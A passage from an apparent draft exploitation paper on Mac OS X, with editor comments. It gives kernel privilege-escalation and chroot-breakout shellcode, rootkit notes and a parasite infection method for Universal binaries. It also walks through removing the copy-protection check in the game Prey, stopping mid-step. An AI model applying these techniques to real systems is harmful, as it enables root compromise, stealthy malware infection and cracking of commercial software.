+during execution.  Therefore, the jmp instruction needs to compensate
+by adding two bytes to the lenth of the PowerPC assembly.
+
+To verify that this multi-arch technique works, here is the output 
+of gdb when attached to this process on Intel architecture:
+
+	Program received signal SIGTRAP, Trace/breakpoint trap.
+	0x0000201b in trap ()
+	(gdb) x/i $pc
+	0x201b <trap+11>:       int3  
+
+Here is the same output from a PowerPC version of this binary:
+
+	Program received signal SIGTRAP, Trace/breakpoint trap.
+	0x00002018 in trap ()
+	(gdb) x/i $pc
+	0x2018 <trap+4>:        trap
+
+--[ 5 - Writing Kernel level shellcode
+
+In this section we will look at some techniques for writing shellcode
+for use when exploiting kernel level vulnerabilities.
+
+A couple of things to note before we begin. Mac OS X does not share an 
+address space for kernel/user space. Both the kernel and userspace
+have a 4gb address space each (0x0 -> 0xffffffff).
+
+I did not bother with writing PowerPC code again for most of what I've 
+done, if you really want PowerPC code some concepts here will quickly
+port others require a little thought ;).
+
+--[ 5.1 - Local privilege escalation
+
+The first type of kernel shellcode we will look at writing is for
+local vulnerabilities. The typical objective for local kernel
+shellcode is simply to escalate the privileges of our userspace
+process.
+
+This topic was covered in noir's excellent paper on OpenBSD kernel 
+exploitation in Phrack 60. [6]
+
+A lot of the techniques from noir's paper apply directly to Mac OS X.
+noir shows that the sysctl() function can be used to retrieve the  
+kinfo_proc struct for a particular process id. As you can see below
+one of the members of the kinfo_proc struct is a pointer to the proc 
+struct. 
+
+struct kinfo_proc {
+        struct  extern_proc kp_proc;             /* proc structure */
+        struct  eproc {
+                struct  proc *e_paddr;          /* address of proc */
+                struct  session *e_sess;        /* session pointer */
+                struct  _pcred e_pcred;         /* process credentials */
+                struct  _ucred e_ucred;         /* current credentials */
+                struct   vmspace e_vm;          /* address space */
+                pid_t   e_ppid;                 /* parent process id */
+                pid_t   e_pgid;                 /* process group id */
+                short   e_jobc;                 /* job control counter */
+                dev_t   e_tdev;                 /* controlling tty dev */
+                pid_t   e_tpgid;                /* tty process group id */
+                struct  session *e_tsess;       /* tty session pointer */
+#define WMESGLEN        7
+                char    e_wmesg[WMESGLEN+1];    /* wchan message */
+                segsz_t e_xsize;                /* text size */
+                short   e_xrssize;              /* text rss */
+                short   e_xccount;              /* text references */
+                short   e_xswrss;
+                int32_t e_flag;
+#define EPROC_CTTY      0x01    /* controlling tty vnode active */
+#define EPROC_SLEADER   0x02    /* session leader */
+#define COMAPT_MAXLOGNAME       12
+                char e_login[COMAPT_MAXLOGNAME];/* short setlogin() name*/
+                int32_t e_spare[4];
+        } kp_eproc;
+};
+
+Ilja van Sprundel mentioned this technique in his talk at Blackhat [7].
+Basically, we can use the leaked address "p.kp_eproc.ep_addr" to access
+the proc struct for our process in memory.
+
+The following function will return the address of a pid's proc struct 
+in the kernel.
+
+long get_addr(pid_t pid) {
+        int i, sz = sizeof(struct kinfo_proc), mib[4];
+        struct kinfo_proc p;
+        mib[0] = CTL_KERN;
+        mib[1] = KERN_PROC;
+        mib[2] = KERN_PROC_PID;
+        mib[3] = pid;
+        i = sysctl(&mib, 4, &p, &sz, 0, 0);
+        if (i == -1) {
+                perror("sysctl()");
+                exit(0);
+        }
+        return(p.kp_eproc.e_paddr);
+}
+
+Now that we have the address of our proc struct, we simply have to 
+change our uid and/or euid in their respective structures.
+
+Here is a snippet from the proc struct:
+
+struct  proc {
+        LIST_ENTRY(proc) p_list;        /* List of all processes. */
+
+        /* substructures: */
+        struct  ucred *p_ucred;         /* Process owner's identity. */
+        struct  filedesc *p_fd;         /* Ptr to open files structure. */
+        struct   pstats *p_stats; /* Accounting/statistics (PROC ONLY). */
+        struct  plimit *p_limit;        /* Process limits. */
+        struct  sigacts *p_sigacts;
+	/* Signal actions, state (PROC ONLY). */
+	...
+}
+
+As you can see, following the p_list there is a pointer to the 
+ucred struct. This struct is shown below.
+
+struct _ucred {
+        int32_t cr_ref;                 /* reference count */
+        uid_t   cr_uid;                 /* effective user id */
+        short   cr_ngroups;             /* number of groups */
+        gid_t   cr_groups[NGROUPS];     /* groups */
+};
+
+By changing the cr_uid field in this struct, we set the euid of
+our process. 
+
+The following assembly code will seek to this struct and null
+out the ucred cr_uid field. This leaves us with root
+privileges on an Intel platform.
+
+SECTION .text
+_main:  
+        mov     ebx, [0xdeadbeef]       ;# ebx = proc address
+        mov     ecx, [ebx + 8]          ;# ecx = ucred
+        xor     eax,eax
+        mov     [ecx + 12], eax         ;# zero out the euid
+        ret
+
+To use this code we need to replace the address 0xdeadbeef with
+the address of the proc struct which we looked up earlier.
+
+Here is some code from Ilja van Sprundel's talk which does the
+same thing on a PowerPC platform.
+
+int kshellcode[] = { 
+	0x3ca0aabb, // lis r5, 0xaabb 
+	0x60a5ccdd, // ori r5, r5, 0xccdd 
+	0x80c5ffa8, // lwz r6, ­88(r5) 
+	0x80e60048, // lwz r7, 72(r6) 
+	0x39000000, // li r8, 0 
+	0x9106004c, // stw r8, 76(r6) 
+	0x91060050, // stw r8, 80(r6) 
+	0x91060054, // stw r8, 84(r6) 
+	0x91060058, // stw r8, 88(r6) 
+	0x91070004  // stw r8, 4(r7) 
+} 
+
+We can combine the two shellcodes into one architecture 
+spanning shellcode. This is a simple process and is 
+documented in section 4 of this paper.
+
+The full listing for our multi-arch code is shown
+in the Appendix.
+
+On PowerPC processors XNU uses an optimization referred to 
+as the "user memory window". This means that the user address
+space and the kernel address space share some mappings.
+
+This design is in place for copyin/copyout etc to use.
+The user memory window typically starts at 0xe0000000 in both
+the kernel and user address space. This can be useful when 
+trying to position shellcode for use in local privilege 
+escalation vulnerabilities.
+
+--[ 5.2 - Breaking chroot()
+
+Before we look into how we can go about breaking out of
+processes after they have used the chroot() syscall, we 
+will a look at why, a lot of the time, we don't need to.
+
+-[root@fry:/chroot]# touch file_outside_chroot
+
+-[root@fry:/chroot]# ls -lsa file_outside_chroot 
+0 -rw-r--r--   1 root  admin  0 Jan 29 12:17 file_outside_chroot
+
+-[root@fry:/chroot]# chroot demo /bin/sh
+
+-[root@fry:/]# ls -lsa file_outside_chroot
+ls: file_outside_chroot: No such file or directory
+
+-[root@fry:/]# pwd                        
+/
+
+-[root@fry:/]# ls -lsa ../file_outside_chroot
+0 -rw-r--r--   1 root  admin  0 Jan 29 20:17 ../file_outside_chroot
+
+-[root@fry:/]# ../../usr/sbin/chroot ../../ /bin/sh
+
+-[root@fry:/]# ls -lsa /chroot/file_outside_chroot 
+0 -rw-r--r--   1 root  admin  0 Jan 29 12:17 /chroot/file_outside_chroot
+
+As you can see, the /usr/sbin/chroot command which ships
+with Mac OS X does not chdir() and therefore does not 
+really do very much at all.
+
+The author suggests the following addition be made to the
+chroot man page on Mac OS X:
+
+	"Caution: Does not work."
+
+On an unrelated note, this patch would also be suitable for
+the setreuid() man page.
+
+I won't spend too much time on this since noir already 
+covered it really well in his paper. [6]
+
+Basically as noir mentions, all we need to do to break our 
+process out of the chroot() is to set the p->p_fd->fd_rdir
+element in our proc struct to NULL.
+
+We can get the address of our proc struct using sysctl as
+mentioned earlier.
+
+noir already provides us with the instructions for this:
+
+mov	edx,[ecx + 0x14] 	;# edx = p->p_fd
+mov	[edx + 0xc],eax		;# p->p_fd->fd_rdir = 0
+
+
+--[ 5.3 -  Advancements 
+
+Now that we are familiar with writing shellcode for use
+in local exploits, where we already have local access to 
+the box, the rest of the kernel related code in this paper
+will focus on accomplishing it's task without any userspace 
+access required. 
+
+In order to do this, we can utilize the per cpu/task/proc/ 
+and thread structures in the kernel. The definitions for 
+each of these structures can be found in the osfmk/kern 
+and bsd/sys/ directories in various header files.
+
+The first struct which we will look at is the "cpu_data"
+struct found in osfmk/i386/cpu_data.h.
+
+I have included the definition for this struct below:
+
+/*
+ * Per-cpu data.
+ *   
+ * Each processor has a per-cpu data area which is dereferenced through the
+ * using this, in-lines provides single-instruction access to frequently 
+ * used members - such as get_cpu_number()/cpu_number(), and 
+ * get_active_thread()/ current_thread(). 
+ * 
+ * Cpu data owned by another processor can be accessed using the
+ * cpu_datap(cpu_number) macro which uses the cpu_data_ptr[] array of 
+ * per-cpu pointers.
+ */
+typedef struct cpu_data
+{
+        struct cpu_data         *cpu_this;        /* pointer to myself */
+        thread_t                cpu_active_thread;
+        void                    *cpu_int_state;     /* interrupt state */
+        vm_offset_t             cpu_active_stack;  /* kernel stack base */
+        vm_offset_t             cpu_kernel_stack;  /* kernel stack top */
+        vm_offset_t             cpu_int_stack_top;
+        int                     cpu_preemption_level;
+        int                     cpu_simple_lock_count;
+        int                     cpu_interrupt_level;
+        int                     cpu_number;             /* Logical CPU */
+        int                     cpu_phys_number;        /* Physical CPU */
+        cpu_id_t                cpu_id;              /* Platform Expert */
+        int                     cpu_signals;            /* IPI events */
+        int                     cpu_mcount_off;    /* mcount recursion */
+        ast_t                   cpu_pending_ast;
+        int                     cpu_type;
+        int                     cpu_subtype;
+        int                     cpu_threadtype;
+        int                     cpu_running;
+        uint64_t                rtclock_intr_deadline;
+        rtclock_timer_t         rtclock_timer;
+        boolean_t               cpu_is64bit;
+        task_map_t              cpu_task_map;
+        addr64_t                cpu_task_cr3;
+        addr64_t                cpu_active_cr3;
+        addr64_t                cpu_kernel_cr3;
+        cpu_uber_t              cpu_uber;
+        void                    *cpu_chud;
+        void                    *cpu_console_buf;
+        struct cpu_core         *cpu_core;         /* cpu's parent core */
+        struct processor        *cpu_processor;
+        struct cpu_pmap         *cpu_pmap;
+        struct cpu_desc_table   *cpu_desc_tablep;
+        struct fake_descriptor  *cpu_ldtp;
+        cpu_desc_index_t        cpu_desc_index;
+        int                     cpu_ldt;
+#ifdef MACH_KDB
+        /* XXX Untested: */
+        int                     cpu_db_pass_thru;
+        vm_offset_t     cpu_db_stacks;
+        void            *cpu_kdb_saved_state;
+        spl_t           cpu_kdb_saved_ipl;
+        int                     cpu_kdb_is_slave;
+        int                     cpu_kdb_active;
+#endif /* MACH_KDB */
+        boolean_t               cpu_iflag;
+        boolean_t               cpu_boot_complete;
+        int                     cpu_hibernate;
+        pmsd                    pms; /* Power Management Stepper control */
+        uint64_t            rtcPop; /* when the etimer wants a timer pop */
+
+        vm_offset_t     cpu_copywindow_bas;
+        uint64_t        *cpu_copywindow_pdp;
+
+        vm_offset_t     cpu_physwindow_base;
+        uint64_t        *cpu_physwindow_ptep;
+        void            *cpu_hi_iss;
+        boolean_t       cpu_tlb_invalid;
+
+        uint64_t        *cpu_pmHpet; 
+	/* Address of the HPET for this processor */
+        uint32_t        cpu_pmHpetVec;  
+	/* Interrupt vector for HPET for this processor */
+/*      Statistics */
+        pmStats_t       cpu_pmStats;  
+	/* Power management data */
+        uint32_t        cpu_hwIntCnt[256];         /* Interrupt counts */
+
+        uint64_t                cpu_dr7; /* debug control register */
+} cpu_data_t;
+
+As you can see, this structure contains valuable information 
+for our shellcode running in the kernel. We just need to 
+figure out how to access it.
+
+The following macro shows how we can access this structure.
+
+/* Macro to generate inline bodies to retrieve per-cpu data fields. */
+#define offsetof(TYPE,MEMBER) ((size_t) &((TYPE *)0)->MEMBER)
+#define CPU_DATA_GET(member,type)                                       \
+        type ret;                                                       \
+        __asm__ volatile ("movl %%gs:%P1,%0"                            \
+                : "=r" (ret)                                            \
+                : "i" (offsetof(cpu_data_t,member)));                   \
+        return ret;
+
+When our code is executing in kernel space the gs selector can be used
+to access our cpu_data struct. The first element of this struct
+contains a pointer to the struct itself, so we no longer need to
+use gs after this.
+
+The first objective we will look at is the ability to find the
+init process (pid=1) via this struct. Since our code may not
+be running with an associated user space thread, we cannot count
+on the uthread struct being populated in our thread_t struct.
+An example of this might be when we exploit a network stack or
+kernel extension.
+
+The first step we must make to find the init process struct
+is to retrieve the pointer to our thread_t struct.
+
+We can do this by simply retrieving the pointer at gs:0x04.
+The following instructions will achieve this:
+
+_main:  
+        xor     ebx,ebx				;# zero ebx
+        mov     eax,[gs:0x04 + ebx]             ;# thread_t.
+
+After these instructions are executed, we have a pointer to 
+our thread struct in eax. The thread struct is defined in 
+osfmk/kern/thread.h. A portion of this struct is shown below:
+
+struct thread {
+...
+        queue_chain_t   links;          /* run/wait queue links */
+        run_queue_t     runq;   /* run queue thread is on SEE BELOW */
+        wait_queue_t    wait_queue;  /* wait queue we are currently on */
+        event64_t               wait_event;       /* wait queue event */
+        integer_t               options;/* options set by thread itself */
+...
+  /* Data used during setrun/dispatch */
+        timer_data_t            system_timer;  /* system mode timer */
+        processor_set_t         processor_set;/* assigned processor set */
+        processor_t bound_processor; /* bound to a processor? */
+        processor_t last_processor;     /* processor last dispatched on */
+        uint64_t    last_switch;        /* time of last context switch */
+...
+	void                                    *uthread;
+#endif
+};
+
+This struct, again, contains many fields which are useful 
+for our shellcode. However, in this case we are trying to
+find the proc struct. Because we might not necessarily 
+already have a uthread associated with us, as mentioned 
+earlier, we must look elsewhere for a list of tasks to 
+locate init (launchd). 
+
+The next step in this process is to retrieve the 
+"last_processor" element from our thread_t struct.
+We do this using the following instructions: 
+
+        mov     bl,0xf4
+        mov     ecx,[eax + ebx]                 ;# last_processor
+
+The last_processor pointer points to a processor 
+struct as the name suggests ;) We can walk from the
+last_processor struct back to the default pset in 
+order to find the pset which contains init.
+
+        mov     eax,[ecx]                       ;# default_pset + 0xc
+
+We then retrieve the task head from this struct.
+
+        push    word 0x458
+        pop     bx
+        mov     eax,[eax + ebx]                 ;# tasks head.
+
+And retrieve the bsd_info element of the task.
+This is a proc struct pointer.
+
+        push    word 0x19c
+        pop     bx
+        mov     eax,[eax + ebx]                 ;# get bsd_info
+
+The proc struct is defined in xnu/bsd/sys/proc_internal.h.
+The first element of the proc struct is:
+
+        LIST_ENTRY(proc) p_list;        /* List of all processes. */
+
+We can walk this list o find a particular process that we want. 
+For most of our code we will start with a pointer to the init 
+process (launchd on Mac OS X). This process has a pid of 1.
+
+To find this we simply walk the list checking the pid field 
+at offset 36. The code to do this is as follows:
+
+next_proc:
+        mov     eax,[eax+4]                     ;# prev         
+        mov     ebx,[eax + 36]                  ;# pid
+        dec     ebx
+        test    ebx,ebx                         ;# if pid was 1
+        jnz     next_proc
+done:
+;#      eax = struct proc *init;
+
+Now that we have developed code which will retrieve a pointer
+to the proc struct for the init process, we can look at some 
+of the things that we can accomplish using this pointer.
+
+The first thing which we will look at is simply rewriting the 
+privilege escalation code listed earlier. Our new version of 
+this code will not require any help from userspace (sysctl etc).
+
+I think the below code is fairly self explanatory.
+
+%define PID 1337
+
+find_pid:
+        mov     eax,[eax + 4]                   ;# eax = next proc
+        mov     ebx,[eax + 36]                  ;# pid
+        cmp     bx,PID
+        jnz     find_pid
+        mov     ecx, [eax + 8]          ;# ecx = ucred
+        xor     eax,eax
+        mov     [ecx + 12], eax         ;# zero out the euid
+
+As you can see the cpu_data struct opens up many possibilities 
+for our shellcode. Hopefully I will have time to go into some 
+of these in a future paper.
+
+--[ 6 - Misc Rootkit Techniques
+
+In this section I will run over a few short pieces of 
+information which might be relevant to someone who is 
+developing a rootkit for Mac OS X. I didn't really have 
+another place to put this stuff, so this will have to do.
+
+The first thing to note is that an API exists [21] for 
+executing userspace applications from kernelspace. This 
+is called the Kernel User Notification Daemon. This is 
+implemented using a mach port which the kernel uses to 
+communicate  with a userspace daemon named kuncd.
+
+The file xnu/osfmk/UserNotification/UNDRequest.defs 
+contains the Mach Interface Generator (MIG) interface
+definitions for the communication with this daemon.
+
+The mach port is called: 
+"com.apple.system.Kernel[UNC]Notifications" and is
+registered by the daemon /usr/libexec/kuncd.
+
+Here is an example of how to use this interface 
+programmatically. The interface allows you to display
+messages via the GUI to the user, and also run any 
+application.
+
+kern_return_t ret;
+ret = KUNCExecute(
+	"/Applications/TextEdit.app/Contents/MacOS/TextEdit", 
+	kOpenAppAsRoot,
+	kOpenApplicationPath
+);
+ret = KUNCExecute(
+	"Internet.prefPane", 
+	kOpenAppAsConsoleUser, 
+	kOpenPreferencePanel
+);
+
+There may be a situation where you wish code to be executed on all the 
+processors on a system. This may be something like updating the IDT / MSR 
+and not wanting a processor to miss out on it.
+
+The xnu kernel provides a function for this. The comment and prototype 
+explain this a lot better than I can. So here you go:
+
+/*
+ * All-CPU rendezvous:
+ *      - CPUs are signalled,
+ *      - all execute the setup function (if specified),
+ *      - rendezvous (i.e. all cpus reach a barrier),
+ *      - all execute the action function (if specified),
+ *      - rendezvous again,
+ *      - execute the teardown function (if specified), and then
+ *      - resume.
+ *
+ * Note that the supplied external functions _must_ be reentrant and aware
+ * that they are running in parallel and in an unknown lock context.
+ */
+
+void
+mp_rendezvous(void (*setup_func)(void *),
+              void (*action_func)(void *),
+              void (*teardown_func)(void *),
+              void *arg)
+{
+
+The code for the functions related to this are stored in 
+xnu/osfmk/i386/mp.c.
+
+--[ 7 - Universal Binary Infection
+
+[SINCE YOU CHAT A BIT ABOUT MACH-O HERE, MAYBE MOVE THIS SECTION
+TO SOMEWHERE EARLIER IN THE PAPER?  YOU CAN EXPAND A LITTLE AND 
+IT MIGHT MAKE THE LINKEDIT / LC_SYMTAB ETC SECTION MORE CLEAR AS
+YOU ALSO GO INTO THE MAGIC NUMER MUMBO-JUMBO HERE AS WELL]
+The Mach-O object format is used on operating systems which have
+a kernel based on Mach. This is the format which is used by 
+Mac OS X. Significant work has already been done regarding the
+infection of this format. The papers [12] and [13] show some of
+this. Mach-O files can be identified by the first four bytes of 
+the file which contain the magic number 0xfeedface.
+
+Recently Mac OS X has moved from the PowerPC platform to Intel 
+architecture. This move has caused a new binary format to be 
+used for most of the applications on Mac OS X 10.4. The Universal
+Binary format is defined in the Mach-O Runtime reference from 
+Apple. [4].
+
+The Universal Binary format is a fairly trivial archive format
+which allows for multiple Mach-O files of varying architecture
+types to be stored in a single file. The loader on Mac OS X is 
+able to interpret this file and distinguish which of the Mach-O
+files inside the archive matches the architecture type of the 
+current system. (We'll look at this a little more later.)
+
+The structures used by Mac OS X to define and parse Universal
+binaries are contained in the file /usr/include/mach-o/fat.h.
+
+Universal binaries are recognizable, again, by the magic number
+in the first four bytes of the file. Universal binaries begin 
+with the following header:
+
+struct fat_header {
+	uint32_t        magic;          /* FAT_MAGIC */
+	uint32_t        nfat_arch;      /* number of structs that follow */
+};
+
+The magic number on a universal binary is as follows:
+
+#define FAT_MAGIC       0xcafebabe
+#define FAT_CIGAM       0xbebafeca      /* NXSwapLong(FAT_MAGIC) */
+
+Either FAT_MAGIC or FAT_CIGAM is used depending on the endian of
+the file/system.
+
+The nfat_arch field of this structure contains the number of 
+Mach-O files of which the archive is comprised. On a side note
+if you set this high enough to wrap, just about every debugging
+tool on Mac OS X will crash, as demonstrated below:
+
+-[nemo@fry:~]$ printf "\xca\xfe\xba\xbe\x66\x66\x66\x66" > file
+-[nemo@fry:~]$ otool -tv file
+Segmentation fault
+
+For each of the Mach-O files in the Universal binary there 
+is also a fat_arch structure.
+
+This structure is shown below:
+
+struct fat_arch {
+        cpu_type_t      cputype;     /* cpu specifier (int) */
+        cpu_subtype_t   cpusubtype;  /* machine specifier (int) */
+        uint32_t        offset;      /* file offset to this object file */
+        uint32_t        size;        /* size of this object file */
+        uint32_t        align;       /* alignment as a power of 2 */
+};
+
+The fat_arch structure defines the architecture type of the
+Mach-O file, as well as the offset into the Universal binary
+in which it is stored. It also contains the alignment of the
+architecture for the particular file, expressed as a power
+of 2.
+
+The diagram below describes the layout of a typical Universal
+binary:
+[YOU SWITCH CAPITALIZATION OF UNIVERSAL QUITE OFTEN IN THIS SECTION]
+
+._________________________________________________,
+|0xcafebabe                                       |
+|   struct fat_header                             |
+|-------------------------------------------------|
+| fat_arch struct #1                              |------------+
+|-------------------------------------------------|            |
+| fat_arch struct #2                              |---------+  |
+|-------------------------------------------------|         |  |
+| fat_arch struct #n                              |------+  |  |
+|-------------------------------------------------|<-----------+
+|0xfeedface                                       |      |  |
+|                                                 |      |  |
+|    Mach-O File #1                               |      |  |
+|                                                 |      |  |
+|                                                 |      |  |
+|-------------------------------------------------|<--------+  
+|0xfeedface                                       |      |
+|                                                 |      |
+|    Mach-O File #2                               |      |
+|                                                 |      |
+|                                                 |      |
+|-------------------------------------------------|<-----+
+|0xfeedface                                       |
+|                                                 |
+|    Mach-O file #n                               |
+|                                                 |
+|                                                 |
+'-------------------------------------------------'
+
+Here you can see the file beginning with a fat_header
+structure. Following this are n * fat_arch structures
+each defining the offset into the file to find the
+particular Mach-O file described by the structure.
+Finally n * Mach-O files are appended to the structs.
+
+Before I run through the method for infecting Universal
+binaries I will first show how the kernel loads them.
+
+The file:  xnu/bsd/kern/kern_exec.c contains the code
+shown in this section.
+
+First the kernel sets up a NULL terminated array of 
+execsw structs.  Each of these structures contain a 
+function pointer to an  image activator / parser for 
+the different image types, as well as a relevant string 
+description.
+
+The definition and declaration of this array is shown 
+below:
+
+/*
+ * Our image activator table; this is the table of the image types we are
+ * capable of loading.  We list them in order of preference to ensure the
+ * fastest image load speed.
+ *
+ * XXX hardcoded, for now; should use linker sets
+ */
+struct execsw {
+        int (*ex_imgact)(struct image_params *);
+        const char *ex_name;
+} execsw[] = {
+        { exec_mach_imgact,             "Mach-o Binary" },
+        { exec_fat_imgact,              "Fat Binary" },
+#ifdef IMGPF_POWERPC
+        { exec_powerpc32_imgact,        "PowerPC binary" },
+#endif  /* IMGPF_POWERPC */
+        { exec_shell_imgact,            "Interpreter Script" },
+        { NULL, NULL}
+};
+
+The following code from the execve() system call loops 
+through each of the elements in this array and calls 
+the function pointer for each one. A pointer to the 
+start of the image is passed to it. 
+
+int
+execve(struct proc *p, struct execve_args *uap, register_t *retval)
+{
+	...
+
+        for(i = 0; error == -1 && execsw[i].ex_imgact != NULL; i++) {
+
+                error = (*execsw[i].ex_imgact)(imgp);
+
+
+Each of the functions parses the file to determine
+if the file is of the appropriate architecture type.
+The function which is responsible for matching and
+parsing Universal binaries is the "exec_fat_imgact"
+function.
+
+The declaration of this function is below:
+
+/*
+ * exec_fat_imgact
+ *
+ * Image activator for fat 1.0 binaries.  If the binary is fat, then we
+ * need to select an image from it internally, and make that the image
+ * we are going to attempt to execute.  At present, this consists of
+ * reloading the first page for the image with a first page from the
+ * offset location indicated by the fat header.
+ *
+ * Important:   This image activator is byte order neutral.
+ *
+ * Note:    If we find an encapsulated binary, we make no assertions
+ *          about its  validity; instead, we leave that up to a rescan
+ *          for an activator to claim it, and, if it is claimed by one,
+ *          that activator is responsible for determining validity.
+ */
+static int
+exec_fat_imgact(struct image_params *imgp)
+
+The first thing this function does is test the 
+magic number at the top of the file. The following
+code does this.
+
+        /* Make sure it's a fat binary */
+        if ((fat_header->magic != FAT_MAGIC) &&
+            (fat_header->magic != FAT_CIGAM)) {
+                error = -1;
+                goto bad;
+        }
+
+The fatfile_getarch_affinity() function is then 
+called to search the universal binary for a 
+Mach-O file with the appropriate architecture 
+type for the system.
+
+   /* Look up our preferred architecture in the fat file. */
+        lret = fatfile_getarch_affinity(imgp->ip_vp,
+                                        (vm_offset_t)fat_header,
+                                        &fat_arch,
+                                        (p->p_flag & P_AFFINITY));
+
+This function is defined in the file: 
+xnu/bsd/kern/mach_fat.c. 
+
+	load_return_t
+	fatfile_getarch_affinity(
+                struct vnode            *vp,
+                vm_offset_t             data_ptr,
+                struct fat_arch *archret,
+                int                             affinity)
+
+This function searches each of the Mach-O files within the 
+Universal binary. A host has a primary and secondary architecture. 
+If during this search, a Mach-O file is found which matches
+the primary architecture type for the host, this file is 
+used. If, however, the primary architecture type is not 
+found, yet the secondary type is found, this will be used.
+This is useful when infecting this format.
+
+Once an appropriate Mach-O file has been located the imgp
+ip_arch_offset and ip_arch_size attributes are updated to
+reflect the new position in the file.
+
+/* Success.  Indicate we have identified an encapsulated binary */
+error = -2;
+imgp->ip_arch_offset = (user_size_t)fat_arch.offset;
+imgp->ip_arch_size = (user_size_t)fat_arch.size;
+
+After this fatfile_getarch_affinity() simply returns and lets
+execve() continue walking the execsw[] struct array to find 
+an appropriate loader for the new file.
+
+This logic means that it does not really matter if the 
+true architecture type of the file matches up with the 
+architecture specified in the fat_header struct within
+the Universal binary. Once a Mach-O file is chosen it will
+be treated as a fresh binary.
+
+The method which I propose to infect Universal binaries 
+utilizes this behavior. A breakdown of this method is
+as follows:
+
+1) Determine the primary and secondary architecture types
+   for the host machine.
+2) Parse the fat_header struct of the host binary.
+3) Walk through the fat_arch structs and locate the 
+   struct for the secondary architecture type.
+4) Check that the size of the parasite is smaller than the 
+   secondary architecture Mach-O file in the Universal binary.
+5) Copy the parasite binary directly over the secondary arch
+   binary inside the universal binary.
+6) Locate the primary architecture's fat_arch structure.
+7) Modify the architecture type field in this structure to be
+   0xdeadbeef.
+
+Now when the binary is executed, the primary architecture 
+is not found. Due to this, the secondary architecture is 
+used. The imgp is set to point to the offset in the file
+containing our parasite, and this is executed as expected.
+The parasite then opens it's own binary (which is quite 
+possible on Mac OS X) and performs a linear search for 
+0xdeadbeef. It then modifies this value, changing it back
+to the primary architecture type and execve()'s it's own file.
+
+Some sample code has been provided with this paper that 
+demonstrates this method on Intel architecture. The code 
+unipara.c will copy an Intel architecture Mach-O file
+over the PowerPC Mach-O file inside a Universal binary.
+After infection has occurred the size of the host file
+remains unchanged.
+
+-[nemo@fry:~/code/unipara]$ ./unipara host parasite
+-[nemo@fry:~/code/unipara]$ ./host
+uid=501(nemo) gid=501(nemo) 
+-[nemo@fry:~/code/unipara]$ wc -c host
+   43028 host
+-[nemo@fry:~/code/unipara]$ ./unipara parasite host
+[+] Initiating infection process.
+[+] Found: 2 arch structs.
+[+] We are good to go, attaching parasite.
+[+] parasite implanted at offset: 0x6000
+[+] Switching arch types to execute our parasite.
+-[nemo@fry:~/code/unipara]$ wc -c host
+   43028 host
+-[nemo@fry:~/code/unipara]$ ./host
+Hello, World!
+uid=501(nemo) gid=501(nemo) 
+
+If residency is required after the payload has already been
+executed, the parasite can simply fork() before modifying 
+it's binary. The parent process can then execve() while the child
+waits and then returns the architecture type to 0xdeadbeef.
+
+--[ 8 - Cracking Example - Prey
+
+Recently, during an extra long stopover in LAX airport (the most
+boring airport in the entire world) I decided I would pass the 
+time by playing the game "Prey" which I had installed onto my 
+laptop.
+
+To my horror, when I tried to start up my game, I was greeted 
+with the following error message:
+
+"Please insert the disc "Prey" or press Quit."
+"Veuillez inserer le disque "Prey" ou appuyer sur Quitter."
+"Bitte legen Sie "Prey" ins Laufwerk ein oder klicken Sie
+auf Beenden."
+
+Since I had nothing better to do, I decided to spend some 
+time removing this error message. First things first I
+determined the object format of the executable file.
+
+-[nemo@fry:/Applications/Prey/Prey.app/Contents/MacOS]$ file Prey
+Prey: Mach-O universal binary with 2 architectures
+Prey (for architecture ppc):    Mach-O executable ppc
+Prey (for architecture i386):   Mach-O executable i386
+
+The Prey executable is a Universal binary containing a 
+PowerPC and an i386 Mach-O binary. 
+
+Next I ran the otool -o command to determine if the code
+was written in Objective-C. The output from this command
+shows that an Objective-C segment is present in the file.
+
+-[nemo@largeprompt]$ otool -o Prey | head -n 5
+Prey:
+Objective-C segment
+Module 0x27ef458
+    version 6
+           size 16
+
+I then used the "class-dump" command [14] to dump the 
+class definitions from the file. Probably the most
+interesting of which is shown below:
+
+	@interface DOOMController (Private)
+	- (void)quakeMain;
+	- (BOOL)checkRegCodes;
+	- (BOOL)checkOS;
+	- (BOOL)checkDVD;
+	@end
+
+Most games on Mac OS X are 10 years behind their Windows
+counterparts when it comes to copy protection. Typically
+the developers don't even strip the file and symbols are 
+still present. Because of this fact, I fired up gdb and 
+put a breakpoint on the main function.
+
+	(gdb) break main
+	Breakpoint 1 at 0x96b64
+
+However when I executed the file the error message was
+displayed prior to my breakpoint in main being reached.
+This lead me to the conclusion that a constructor 
+function was responsible for check. 
+
+To validate this theory I ran the command "otool -l" on
+the binary to list the load commands present in the file.
+(The Mach-O Runtime Document [4] explains the load_command
+struct clearly).
+
+Each section in the Mach-O file has a "flags" value 
+associated with it. This describes the purpose of the 
+section. Possible values for this flags variable are
+found in the file: /usr/include/mach-o/loader.h.
+
+The value which represents a constructor section is 
+defined as follows:
+
+/* section with only function pointers for initialization*/
+#define S_MOD_INIT_FUNC_POINTERS        0x9     
+
+Looking through the "otool -l" output there is only one
+section which has the flags value: 0x9. This section is
+shown below:
+
+Section
+  sectname __mod_init_func
+   segname __DATA
+      addr 0x00515cec
+      size 0x00000380
+    offset 5328108
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000009
+ reserved1 0
+ reserved2 0
+
+Now that the virtual address of the constructor section
+for this application was known, I simply fired up gdb
+again and put breakpoints on each of the pointers 
+contained in this section.
+
+(gdb) x/x 0x00515cec
+0x515cec <_ZTI14idSIMD_Generic+12>:     0x028cc8db
+(gdb) 
+0x515cf0 <_ZTI14idSIMD_Generic+16>:     0x00495852
+(gdb) 
+0x515cf4 <_ZTI14idSIMD_Generic+20>:     0x0049587c
+...
+
+(gdb) break *0x028cc8db
+Breakpoint 1 at 0x28cc8db
+(gdb) break *0x00495852
+Breakpoint 2 at 0x495852
+(gdb) break *0x0049587c
+Breakpoint 3 at 0x49587c
+...
+
+I then executed the program. As expected the first break point
+was hit before the error message box was displayed.
+
+(gdb) r
+Starting program: /Applications/Prey/Prey.app/Contents/MacOS/Prey 
+
+Breakpoint 1, 0x028cc8db in dyld_stub_log10f ()
+(gdb) continue
+
+I then continued execution and the error message appeared. This
+happened before the second breakpoint was reached. This indicated
+that the first pointer in the __mod_init_func was responsible for 
+the DVD checking process.
+
+In order to validate my theory I restarted the process. This time 
+I deleted all breakpoints except the first one.
+
+(gdb) delete
+Delete all breakpoints? (y or n) y
+(gdb) break *0x028cc8db
+Breakpoint 4 at 0x28cc8db
+
+(gdb) r
+Starting program: /Applications/Prey/Prey.app/Contents/MacOS/Prey 
+Reading symbols for shared libraries . done
+
+Once the breakpoint is reached, I simply "return" from the 
